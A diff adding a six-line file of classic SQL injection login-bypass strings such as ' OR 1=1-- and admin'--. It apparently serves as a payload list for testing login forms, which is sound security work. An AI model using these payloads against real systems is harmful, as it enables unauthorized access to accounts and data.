@@ -1,0 +1,6 @@
+admin'--
+' OR 1=1--
+admin' #
+' OR 'x'='x
+') OR ('1'='1
+admin'/*
